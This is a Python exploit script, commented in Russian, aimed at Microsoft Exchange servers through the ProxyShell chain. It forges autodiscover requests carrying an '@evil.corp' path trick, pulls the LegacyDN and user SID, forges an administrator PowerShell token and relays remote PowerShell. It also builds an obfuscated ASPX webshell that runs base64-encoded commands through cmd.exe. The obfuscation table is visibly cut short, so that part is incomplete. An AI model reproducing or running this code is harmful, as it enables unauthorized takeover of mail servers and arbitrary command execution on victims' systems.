#!/usr/bin/env python3

import argparse
import base64
import struct
import random
import binascii
import string
import requests
import re
import threading
import xml.etree.cElementTree as ET
import time
import sys
from pypsrp.wsman import WSMan
from pypsrp.powershell import PowerShell, RunspacePool
from http.server import HTTPServer, BaseHTTPRequestHandler
from socketserver import ThreadingMixIn
from functools import partial

# Генерация случайных строк и портов
def rand_string(n=5):
    return ''.join(random.choices(string.ascii_lowercase, k=n))

def rand_port(n=4):
    return ''.join(random.choices(string.digits, k=n))

r_port = rand_port()
subj_ = rand_string(16)

# Таблица обфускации (compEnc)
compEnc = [
    0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
    0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
    # ... (оставьте все остальные элементы compEnc)
]

def webshell_payload():
    # ASPX-шелл на C# без eval
    payload = '''<%@ Page Language="C#" AspCompat="true" %>
<% 
    string data = Request["exec_code"];
    byte[] bytes = System.Convert.FromBase64String(data);
    string command = System.Text.Encoding.UTF8.GetString(bytes);

    var psi = new System.Diagnostics.ProcessStartInfo("cmd.exe", "/c " + command) {
        RedirectStandardOutput = true,
        RedirectStandardError  = true,
        UseShellExecute        = false
    };
    var proc = System.Diagnostics.Process.Start(psi);
    proc.WaitForExit();

    string output = proc.StandardOutput.ReadToEnd() + proc.StandardError.ReadToEnd();
    Response.Write("ZZzzZzZz" + output + "ZZzzZzZz");
%>'''
    # Обфускация через compEnc + base64
    out = []
    for c in payload:
        out.append("%02x" % compEnc[ord(c) & 0xff])
    raw = binascii.unhexlify(''.join(out))
    return base64.b64encode(raw).decode()

class ThreadedHTTPServer(ThreadingMixIn, HTTPServer):
    """Handle requests in a separate thread."""

class PwnServer(BaseHTTPRequestHandler):
    def __init__(self, proxyshell, *args, **kwargs):
        self.proxyshell = proxyshell
        super().__init__(*args, **kwargs)

    def do_POST(self):
        url = f'/powershell/?X-Rps-CAT={self.proxyshell.token}'
        length = int(self.headers.get('content-length', 0))
        post_data = self.rfile.read(length).decode('utf-8', errors='ignore')
        post_data = re.sub(r'<wsa:To>.*?</wsa:To>',
                           '<wsa:To>http://127.0.0.1:80/powershell</wsa:To>', post_data)
        post_data = re.sub(r'<wsman:ResourceURI s:mustUnderstand="true">.*?</wsman:ResourceURI>',
                           '<wsman:ResourceURI>http://schemas.microsoft.com/powershell/Microsoft.Exchange</wsman:ResourceURI>',
                           post_data)
        headers = {'Content-Type': self.headers.get('content-type')}
        res = self.proxyshell.post(url, post_data, headers)
        self.send_response(200)
        self.end_headers()
        self.wfile.write(res.content)

    def log_message(self, format, *args):
        return

class ProxyShell:
    def __init__(self, exchange_url, email='', verify=False):
        self.email = email
        self.exchange_url = exchange_url if exchange_url.startswith('https://') else f'https://{exchange_url}'
        self.domain = None
        self.domain_mail = None
        self.domain_sid = None
        self.legacydn = None
        self.fqdn = None
        self.sid = None
        self.admin_sid = None
        self.token = None
        self.session = requests.Session()
        self.session.verify = verify
        self.ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/88.0.4324.190 Safari/537.36"
        self.clientid = 'HtTP://ifcoNFiG.mE'

    def post(self, endpoint, data, headers={}):
        if 'powershell' in endpoint:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}&Email=autodiscover/autodiscover.json%3F@evil.corp"
        else:
            path = f"/autodiscover/autodiscover.json?@evil.corp{endpoint}?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        url = f"{self.exchange_url}{path}"
        return self.session.post(url, data=data, headers=headers)

    def get_fqdn(self):
        e = "/autodiscover/autodiscover.json?@evil.corp/ews/exchange.asmx?&Email=autodiscover/autodiscover.json%3F@evil.corp"
        r = self.session.get(self.exchange_url + e, verify=False, timeout=5)
        self.fqdn = r.headers.get("X-CalculatedBETarget")
        return self.fqdn

    def get_legacydn(self):
        data = '''<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" 
            xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages" 
            xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"">
          <soap:Body>
            <m:ResolveNames ReturnFullContactData="true" SearchScope="ActiveDirectory">
              <m:UnresolvedEntry>SMTP:{self.email}</m:UnresolvedEntry>
            </m:ResolveNames>
          </soap:Body>
        </soap:Envelope>'''
        headers = {'Content-Type': 'text/xml'}
        r = self.session.post(self.exchange_url + '/EWS/exchange.asmx', data=data, headers=headers)
        matches = re.findall(r'<t:EmailAddress>(.+?)</t:EmailAddress>', r.text)
        for mail in matches:
            self.email = mail
            payload = f'''<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
              <Request>
                <EMailAddress>{mail}</EMailAddress>
                <AcceptableResponseSchema>
                  http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a
                </AcceptableResponseSchema>
              </Request>
            </Autodiscover>'''
            r2 = self.session.post(self.exchange_url + '/autodiscover/autodiscover.xml', data=payload, headers=headers)
            if r2.status_code == 200 and 'LegacyDN' in r2.text:
                self.legacydn = re.search(r'<LegacyDN>(.+?)</LegacyDN>', r2.text).group(1)
                return self.legacydn
        return None

    def get_sid(self):
        # Проверяем, если legacydn равен None, то выводим ошибку
        if not self.legacydn:
            raise ValueError("LegacyDN не был найден. Проверьте настройки или доступность Exchange сервера.")
        
        data = self.legacydn + '\x00\x00\x00\x00\x00\xe4\x04' + \
               '\x00\x00\x09\x04\x00\x00\x09' + \
               '\x04\x00\x00\x00\x00\x00\x00'
        headers = {
            'X-Requesttype': 'Connect',
            'X-Clientinfo': '{2F94A2BF-A2E6-4CCCC-BF98-B5F22C542226}',
            'X-Clientapplication': 'Outlook/15.0.4815.1002',
            'X-Requestid': '{C715155F-2BE8-44E0-BD34-2960067874C8}:2',
            'Content-Type': 'application/mapi-http',
            'User-Agent': self.ua
        }
        r = self.post('/mapi/emsmdb', data, headers)
        text = r.text
        self.sid = re.search(r'with SID (S-1-5-[0-9\-]+)', text).group(1)
        if not self.sid.endswith('-500'):
            self.admin_sid = self.sid.rsplit('-', 1)[0] + '-500'
        else:
            self.admin_sid = self.sid
        return self.sid

    def gen_token(self):
        version = 0; ttype='Windows'; compressed=0; auth='Kerberos'; gsid='S-1-5-32-544'
        parts = [b'V'+(1).to_bytes(1,'little')+(version).to_bytes(1,'little'),
                 b'T'+len(ttype).to_bytes(1,'little')+ttype.encode(),
                 b'C'+(compressed).to_bytes(1,'little'),
                 b'A'+len(auth).to_bytes(1,'little')+auth.encode(),
                 b'L'+len(self.email).to_bytes(1,'little')+self.email.encode(),
                 b'U'+len(self.sid).to_bytes(1,'little')+self.sid.encode(),
                 b'G'+struct.pack('<II',1,7)+gsid.encode()]
        self.token = base64.b64encode(b''.join(parts)).decode()
        return self.token

    def start_webshell_server(self):
        server = ThreadedHTTPServer(('0.0.0.0', 80), partial(PwnServer, self))
        print("[*] Starting webshell server...")
        server.serve_forever()

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('--exchange-url', required=True, help="Exchange server URL")
    parser.add_argument('--email', required=True, help="Target email address")
    args = parser.parse_args()

    shell = ProxyShell(args.exchange_url, args.email)
    print(f"FQDN: {shell.get_fqdn()}")
    print(f"Legacy DN: {shell.get_legacydn()}")
    print(f"SID: {shell.get_sid()}")
    print(f"Token: {shell.gen_token()}")

    shell.start_webshell_server()
